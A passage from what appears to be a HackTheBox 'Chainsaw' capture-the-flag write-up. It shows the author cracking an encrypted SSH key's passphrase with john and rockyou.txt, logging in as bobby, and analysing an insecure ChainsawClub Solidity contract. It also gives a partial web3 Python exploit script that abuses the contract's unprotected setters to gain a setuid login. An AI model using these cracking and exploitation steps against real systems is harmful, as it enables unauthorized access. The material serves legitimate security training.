class="line">V0Fzenp0TXVJVjFlbW50OTdvTQpJbW5mb250T1lkd0I2LzJvQ3V5SlRpZjhWdy9XdFdxWk5icGV5</span><br><span class="line">OTcwNGE5bWFwLytiRHFlUVE0MStCOEFDRGJLCldvdnNneVdpL1VwaU1UNm02clgrRlA1RDVFOHpy</span><br><span class="line">WXRubm1xSW83dnhIcXRCV1V4amFoQ2RuQnJrWUZ6bDZLV1IKZ0Z6eDNlVGF0bFpXeXI0a3N2Rm10</span><br><span class="line">b2JZa1pWQVFQQUJXeitnSHB1S2xycWhDOUFOenIvSm4rNVpmRzAybW9GLwplZEwxYnA5SFBSSTQ3</span><br><span class="line">RHl2THd6VDEvNUw5Wno2WSsxTXplbmRUaTNLcnpRL1ljZnI1WUFSdll5TUxiTGpNRXRQClV2SmlZ</span><br><span class="line">NDB1Mm5tVmI2UXFwaXkyenIvYU1saHB1cFpQay94dDhvS2hLQytsOW1nT1RzQVhZakNiVG1MWHpW</span><br><span class="line">clgKMTVVMjEwQmR4RUZVRGNpeE5pd1Rwb0JTNk1meENPWndOLzFadjBtRThFQ0krNDRMY3FWdDN3</span><br><span class="line">PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0&#x3D;</span><br><span class="line">-----------------------d296272d7cb599bff2a1ddf6d6374d93--</span><br><span class="line">administrator@chainsaw:&#x2F;home&#x2F;administrator$</span><br></pre></td></tr></table></figure><p>I copied it to my box:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# nano bobby.key.enc.b64</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# base64 -d bobby.key.enc.b64 &gt; bobby.key.enc</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# cat bobby.key.enc</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: DES-EDE3-CBC,53D881F299BA8503</span><br><span class="line"></span><br><span class="line">SeCNYw&#x2F;BsXPyQq1HRLEEKhiNIVftZagzOcc64ff1IpJo9IeG7Z&#x2F;zj+v1dCIdejuk</span><br><span class="line">7ktQFczTlttnrIj6mdBb6rnN6CsP0vbz9NzRByg1o6cSGdrL2EmJN&#x2F;eSxD4AWLcz</span><br><span class="line">n32FPY0VjlIVrh4rjhRe2wPNogAciCHmZGEB0tgv2&#x2F;eyxE63VcRzrxJCYl+hvSZ6</span><br><span class="line">fvsSX8A4Qr7rbf9fnz4PImIgurF3VhQmdlEmzDRT4m&#x2F;pqf3TmGAk9+wriqnkODFQ</span><br><span class="line">I+2I1cPb8JRhLSz3pyB3X&#x2F;uGOTnYp4aEq+AQZ2vEJz3FfX9SX9k7dd6KaZtSAzqi</span><br><span class="line">w981ES85Dk9NUo8uLxnZAw3sF7Pz4EuJ0Hpo1eZgYtKzvDKrrw8uo4RCadx7KHRT</span><br><span class="line">inKXduHznGA1QROzZW7xE3HEL3vxR9gMV8gJRHDZDMI9xlw99QVwcxPcFa31AzV2</span><br><span class="line">yp3q7yl954SCMOti4RC3Z4yUTjDkHdHQoEcGieFOWU+i1oij4crx1LbO2Lt8nHK6</span><br><span class="line">G1Ccq7iOon4RsTRlVrv8liIGrxnhOY295e9drl7BXPpJrbwso8xxHlT3333YU9dj</span><br><span class="line">hQLNp5+2H4+i6mmU3t2ogToP4skVcoqDlCC+j6hDOl4bpD9t6TIJurWxmpGgNxes</span><br><span class="line">q8NsAentbsD+xl4W6q5muLJQmj&#x2F;xQrrHacEZDGI8kWvZE1iFmVkD&#x2F;xBRnwoGZ5ht</span><br><span class="line">DyilLPpl9R+Dh7by3lPm8kf8tQnHsqpRHceyBFFpnq0AUdEKkm1LRMLAPYILblKG</span><br><span class="line">jwrCqRvBKRMIl6tJiD87NM6JBoQydOEcpn+6DU+2Actejbur0aM74IyeenrGKSSZ</span><br><span class="line">IZMsd2kTSGUxy9o&#x2F;xPKDkUw&#x2F;SFUySmmwiqiFL6PaDgxWQwHxtxvmHMhL6citNdIw</span><br><span class="line">TcOTSJczmR2pJxkohLrH7YrS2alKsM0FpFwmdz1&#x2F;XDSF2D7ibf&#x2F;W1mAxL5UmEqO0</span><br><span class="line">hUIuW1dRFwHjNvaoSk+frAp6ic6IPYSmdo8GYYy8pXvcqwfRpxYlACZu4Fii6hYi</span><br><span class="line">4WphT3ZFYDrw7StgK04kbD7QkPeNq9Ev1In2nVdzFHPIh6z+fmpbgfWgelLHc2et</span><br><span class="line">SJY4+5CEbkAcYEUnPWY9SPOJ7qeU7+b&#x2F;eqzhKbkpnblmiK1f3reOM2YUKy8aaleh</span><br><span class="line">nJYmkmr3t3qGRzhAETckc8HLE11dGE+l4ba6WBNu15GoEWAszztMuIV1emnt97oM</span><br><span class="line">ImnfontOYdwB6&#x2F;2oCuyJTif8Vw&#x2F;WtWqZNbpey9704a9map&#x2F;+bDqeQQ41+B8ACDbK</span><br><span class="line">WovsgyWi&#x2F;UpiMT6m6rX+FP5D5E8zrYtnnmqIo7vxHqtBWUxjahCdnBrkYFzl6KWR</span><br><span class="line">gFzx3eTatlZWyr4ksvFmtobYkZVAQPABWz+gHpuKlrqhC9ANzr&#x2F;Jn+5ZfG02moF&#x2F;</span><br><span class="line">edL1bp9HPRI47DyvLwzT1&#x2F;5L9Zz6Y+1MzendTi3KrzQ&#x2F;Ycfr5YARvYyMLbLjMEtP</span><br><span class="line">UvJiY40u2nmVb6Qqpiy2zr&#x2F;aMlhpupZPk&#x2F;xt8oKhKC+l9mgOTsAXYjCbTmLXzVrX</span><br><span class="line">15U210BdxEFUDcixNiwTpoBS6MfxCOZwN&#x2F;1Zv0mE8ECI+44LcqVt3w&#x3D;&#x3D;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw#</span><br></pre></td></tr></table></figure><p>I used <code>ssh2john.py</code> to get the hash of the key in <code>john</code> format then I used <code>john</code> with <code>rockyou.txt</code> to crack it:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# &#x2F;opt&#x2F;ssh2john.py .&#x2F;bobby.key.enc &gt; bobby.key.enc.hash</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt .&#x2F;bobby.key.enc.hash </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (SSH [RSA&#x2F;DSA&#x2F;EC&#x2F;OPENSSH (SSH private keys) 32&#x2F;64])</span><br><span class="line">Cost 1 (KDF&#x2F;cipher [0&#x3D;MD5&#x2F;AES 1&#x3D;MD5&#x2F;3DES 2&#x3D;Bcrypt&#x2F;AES]) is 1 for all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 2 for all loaded hashes</span><br><span class="line">Note: This format may emit false positives, so it will keep trying even after</span><br><span class="line">finding a possible candidate.</span><br><span class="line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">jackychain       (.&#x2F;bobby.key.enc)</span><br><span class="line">1g 0:00:00:22 DONE (2019-11-22 21:56) 0.04380g&#x2F;s 628195p&#x2F;s 628195c&#x2F;s 628195C&#x2F;s *7¡Vamos!</span><br><span class="line">Session completed</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw#</span><br></pre></td></tr></table></figure><p>Password: <code>jackychain</code>, let’s <code>ssh</code> into the box as <code>bobby</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# chmod 600 bobby.key.enc</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# ssh -i bobby.key.enc bobby@chainsaw.htb </span><br><span class="line">Enter passphrase for key &#39;bobby.key.enc&#39;: </span><br><span class="line">bobby@chainsaw:~$ whoami</span><br><span class="line">bobby</span><br><span class="line">bobby@chainsaw:~$ id</span><br><span class="line">uid&#x3D;1000(bobby) gid&#x3D;1000(bobby) groups&#x3D;1000(bobby),30(dip)</span><br><span class="line">bobby@chainsaw:~$ ls -la</span><br><span class="line">total 52</span><br><span class="line">drwxr-x--- 9 bobby bobby 4096 Jan 23  2019 .</span><br><span class="line">drwxr-xr-x 4 root  root  4096 Dec 12  2018 ..</span><br><span class="line">lrwxrwxrwx 1 bobby bobby    9 Nov 30  2018 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r--r-- 1 bobby bobby  220 Sep 12  2018 .bash_logout</span><br><span class="line">-rw-r--r-- 1 bobby bobby 3771 Sep 12  2018 .bashrc</span><br><span class="line">drwx------ 2 bobby bobby 4096 Nov 30  2018 .cache</span><br><span class="line">drwx------ 3 bobby bobby 4096 Nov 30  2018 .gnupg</span><br><span class="line">drwxrwxr-x 3 bobby bobby 4096 Dec 12  2018 .java</span><br><span class="line">drwxrwxr-x 3 bobby bobby 4096 Nov 30  2018 .local</span><br><span class="line">-rw-r--r-- 1 bobby bobby  807 Sep 12  2018 .profile</span><br><span class="line">drwxrwxr-x 3 bobby bobby 4096 Dec 20  2018 projects</span><br><span class="line">drwxrwxr-x 2 bobby bobby 4096 Dec 12  2018 resources</span><br><span class="line">drwxr-x--- 2 bobby bobby 4096 Dec 13  2018 .ssh</span><br><span class="line">-r--r----- 1 bobby bobby   33 Jan 23  2019 user.txt</span><br><span class="line">-rw-rw-r-- 1 bobby bobby    0 Dec 12  2018 .wget-hsts</span><br><span class="line">bobby@chainsaw:~$</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/chainsaw/2.png" alt=""><br>We owned user.</p><h2 id="ChainsawClub-Analysis"><a href="#ChainsawClub-Analysis" class="headerlink" title="ChainsawClub: Analysis"></a>ChainsawClub: Analysis</h2><p>In <code>bobby</code>‘s home directory there was a directory called <code>projects</code> which had a project called <code>ChainsawClub</code>, Inside that directory there was another smart contract:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bobby@chainsaw:~$ cd projects&#x2F;</span><br><span class="line">bobby@chainsaw:~&#x2F;projects$ ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxrwxr-x 3 bobby bobby 4096 Dec 20  2018 .</span><br><span class="line">drwxr-x--- 9 bobby bobby 4096 Jan 23  2019 ..</span><br><span class="line">drwxrwxr-x 2 bobby bobby 4096 Jan 23  2019 ChainsawClub</span><br><span class="line">bobby@chainsaw:~&#x2F;projects$ cd ChainsawClub&#x2F;</span><br><span class="line">bobby@chainsaw:~&#x2F;projects&#x2F;ChainsawClub$ ls -al</span><br><span class="line">total 156</span><br><span class="line">drwxrwxr-x 2 bobby bobby   4096 Jan 23  2019 .</span><br><span class="line">drwxrwxr-x 3 bobby bobby   4096 Dec 20  2018 ..</span><br><span class="line">-rw-r--r-- 1 root  root      44 Nov 22 20:04 address.txt</span><br><span class="line">-rwsr-xr-x 1 root  root   16544 Jan 12  2019 ChainsawClub</span><br><span class="line">-rw-r--r-- 1 root  root  126388 Jan 23  2019 ChainsawClub.json</span><br><span class="line">-rw-r--r-- 1 root  root    1164 Jan 23  2019 ChainsawClub.sol</span><br><span class="line">bobby@chainsaw:~&#x2F;projects&#x2F;ChainsawClub$</span><br></pre></td></tr></table></figure><p><code>ChainsawClub.sol</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.22</span>;</span><br><span class="line"></span><br><span class="line">contract ChainsawClub &#123;</span><br><span class="line"></span><br><span class="line">  string username = <span class="string">'nobody'</span>;</span><br><span class="line">  string password = <span class="string">'7b455ca1ffcb9f3828cfdde4a396139e'</span>;</span><br><span class="line">  bool approve = <span class="keyword">false</span>;</span><br><span class="line">  uint totalSupply = <span class="number">1000</span>;</span><br><span class="line">  uint userBalance = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getUsername</span><span class="params">()</span> <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> <span class="params">(string)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> username;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setUsername</span><span class="params">(string _value)</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">      username = _value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getPassword</span><span class="params">()</span> <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> <span class="params">(string)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> password;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setPassword</span><span class="params">(string _value)</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">      password = _value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getApprove</span><span class="params">()</span> <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> <span class="params">(bool)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> approve;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setApprove</span><span class="params">(bool _value)</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">      approve = _value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getSupply</span><span class="params">()</span> <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> totalSupply;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getBalance</span><span class="params">()</span> <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> userBalance;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span><span class="params">(uint _value)</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (_value &gt; <span class="number">0</span> &amp;&amp; _value &lt;= totalSupply) &#123;</span><br><span class="line">          totalSupply -= _value;</span><br><span class="line">          userBalance += _value;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">reset</span><span class="params">()</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">      username = <span class="string">''</span>;</span><br><span class="line">      password = <span class="string">''</span>;</span><br><span class="line">      userBalance = <span class="number">0</span>;</span><br><span class="line">      totalSupply = <span class="number">1000</span>;</span><br><span class="line">      approve = <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>There was also a <code>setuid</code> <code>elf</code> executable called <code>ChainsawClub</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bobby@chainsaw:~&#x2F;projects&#x2F;ChainsawClub$ file ChainsawClub</span><br><span class="line">ChainsawClub: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]&#x3D;08b87cf44d6a671b91bc55f6e1f53c7ee083a417, not stripped</span><br><span class="line">bobby@chainsaw:~&#x2F;projects&#x2F;ChainsawClub$</span><br></pre></td></tr></table></figure><p>When executed it prints a note saying “Please sign up first and then log in!”, then it asks for credentials:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bobby@chainsaw:~&#x2F;projects&#x2F;ChainsawClub$ .&#x2F;ChainsawClub </span><br><span class="line"></span><br><span class="line">      _           _</span><br><span class="line">     | |         (_)</span><br><span class="line">  ___| |__   __ _ _ _ __  ___  __ ___      __</span><br><span class="line"> &#x2F; __| &#39;_ \ &#x2F; _&#96; | | &#39;_ \&#x2F; __|&#x2F; _&#96; \ \ &#x2F;\ &#x2F; &#x2F;</span><br><span class="line">| (__| | | | (_| | | | | \__ \ (_| |\ V  V &#x2F;</span><br><span class="line"> \___|_| |_|\__,_|_|_| |_|___&#x2F;\__,_| \_&#x2F;\_&#x2F;</span><br><span class="line">                                            club</span><br><span class="line"></span><br><span class="line">- Total supply: 1000</span><br><span class="line">- 1 CHC &#x3D; 51.08 EUR</span><br><span class="line">- Market cap: 51080 (€)</span><br><span class="line"></span><br><span class="line">[*] Please sign up first and then log in!</span><br><span class="line">[*] Entry based on merit.</span><br><span class="line"></span><br><span class="line">Username: </span><br><span class="line">Password: </span><br><span class="line">[*] Wrong credentials!</span><br><span class="line">^C</span><br><span class="line">bobby@chainsaw:~&#x2F;projects&#x2F;ChainsawClub$</span><br></pre></td></tr></table></figure><p>Obviously we’ll use the smart contract to sign up, similar to what we did earlier we’ll write a python script to interact with the contract.<br>We’ll use:<br><code>setUsername()</code> to set the username<br><code>setPassword()</code> to set the password, it has to be <code>md5</code> hashed as we saw:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string password = <span class="string">'7b455ca1ffcb9f3828cfdde4a396139e'</span>;</span><br></pre></td></tr></table></figure><p><code>setApprove()</code> to change <code>approve</code> from <code>false</code> to <code>true</code><br><code>transfer()</code> to transfer coins to the user’s balance, it can’t transfer more than 1000 coins because that’s the value of <code>totalSupply</code> and we can’t transfer more than that:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transfer</span><span class="params">(uint _value)</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (_value &gt; <span class="number">0</span> &amp;&amp; _value &lt;= totalSupply) &#123;</span><br><span class="line">        totalSupply -= _value;</span><br><span class="line">        userBalance += _value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Transferring coins is an important step because when I created a new user without transferring coins I could successfully login but it said that I didn’t have enough funds and exited.</p><h2 id="ChainsawClub-Exploitation"><a href="#ChainsawClub-Exploitation" class="headerlink" title="ChainsawClub: Exploitation"></a>ChainsawClub: Exploitation</h2><p>I used <code>netstat</code> to list the open ports, 63991 was open and listening on <code>localhost</code> only so I assumed that it’s the port on which the contract is deployed:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bobby@chainsaw:~&#x2F;projects&#x2F;ChainsawClub$ netstat -ntlp</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID&#x2F;Program name    </span><br><span class="line">tcp        0      0 0.0.0.0:9810            0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 127.0.0.1:63991         0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp6       0      0 :::21                   :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -</span><br><span class="line">bobby@chainsaw:~&#x2F;projects&#x2F;ChainsawClub$</span><br></pre></td></tr></table></figure><p>I got the <code>ABI</code> of the contract like I did before:<br><img src="/images/hackthebox/chainsaw/3.png" alt=""><br>And we have the address of the contract in <code>address.txt</code><br>I wrote the exploit and forwarded the port to my box:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# ssh -L 63991:127.0.0.1:63991 -i bobby.key.enc bobby@chainsaw.htb                                                                                                          </span><br><span class="line">Enter passphrase for key &#39;bobby.key.enc&#39;:</span><br><span class="line">bobby@chainsaw:~$</span><br></pre></td></tr></table></figure><p>The exploit is similar to the first one.<br><code>ChainsawClubExploit.py</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, eth</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">YELLOW = <span class="string">"\033[93m"</span></span><br><span class="line">GREEN = <span class="string">"\033[32m"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(address, username, password, passhash)</span>:</span></span><br><span class="line">print(YELLOW + <span class="string">"[+] Starting"</span>)</span><br><span class="line">print(YELLOW + <span class="string">"[+] Connecting to localhost:63991"</span>)</span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">'http://localhost:63991'</span>))</span><br><span class="line">print(GREEN + <span class="string">"[*] Connection Established"</span>)</span><br><span class="line">w3.eth.defaultAccount = w3.eth.accounts[<span class="number">0</span>]</span><br><span class="line">print(YELLOW + <span class="string">"[+] Creating the contract representation"</span>)</span><br><span class="line">print(YELLOW + <span class="string">"[+] Address: &#123;&#125;"</span>.format(address))</span><br><span class="line">abi = json.loads(<span class="string">'[ &#123; "constant": true, "inputs": [], "name": "getBalance", "outputs": [ &#123; "name": "", "type": "uint256" &#125; ], "payable": false, "stateMutability": "view", "type": "function" &#125;, &#123; "constant": false, "inputs": [ &#123; "name": "_value", "type": "uint256" &#125; ], "name": "transfer", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" &#125;, &#123; "constant": false, "inputs": [ &#123; "name": "_value", "type": "string" &#125; ], "name": "setPassword", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" &#125;, &#123; "constant": true, "inputs": [], "name": "getUsername", "outputs": [ &#123; "name": "", "type": "string" &#125; ], "payable": false, "stateMutability": "view", "type": "function" &#125;, &#123; "constant": true, "inputs": [], "name": "getSupply", "outputs": [ &#123; "name": "", "type": "uint256" &#125; ], "payable": false, "stateMutability": "view", "type": "function" &#125;, &#123; "constant": true, "inputs": [], "name": "getApprove", "outputs": [ &#123; "name": "", "type": "bool" &#125; ], "payable": false, "stateMutability": "view", "type": "function" &#125;, &#123; "constant": false, "inputs": [ &#123; "name": "_value", "type": "bool" &#125; ], "name": "setApprove", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" &#125;, &#123; "constant": true, "inputs": [], "name": "getPassword", "outputs": [ &#123; "name": "", "type": "string" &#125; ], "payable": false, "stateMutability": "view", "type": "function" &#125;, &#123; "constant": false, "inputs": [], "name": "reset", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" &#125;, &#123; "constant": false, "inputs": [ &#123; "name": "_value", "type": "string" &#125; ], "name": "setUsername", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" &#125; ]'</span>)</span><br><span class="line">contract = w3.eth.contract(address=address, abi=abi)</span><br><span class="line">print(GREEN + <span class="string">"[*] Done"</span>)</span><br><span class="line">print(YELLOW + <span class="string">"[+] Calling setUsername() with: &#123;&#125;"</span>.format(username))</span><br><span class="line">contract.functions.setUsername(username).transact()</span><br><span class="line">print(GREEN + <span class="string">"[*] Done. getUsername(): "</span> + contract.functions.getUsername().call())</span><br><span class="line">print(YELLOW + <span class="string">"[+] Calling setPassword() with: &#123;&#125; (&#123;&#125;)"</span>.format(passhash, password))</span><br><span class="line">contract.functions.setPassword(passhash).transact()</span><br><span class="line">print(GREEN + <span class="string">"[*] Done. getPassword(): "</span> + contract.functions.getPassword().call())</span><br><span class="line">print(YELLOW + <span class="string">"[+] Calling setApprove() with: True"</span>)</span><br><span class="line">contract.functions.setApprove(<span class="literal">True</span>).transact()</span><br><span class="line">print(GREEN + <span class="string">"[*] Done. getApprove(): "</span> + str(contract.functions.getApprove().call()))</span><br><span class="line">print(YELLOW + <span class="string">"[+] Calling transfer() with: 1000"</span>)</span><br><span class="line">contract.functions.transfer(<span 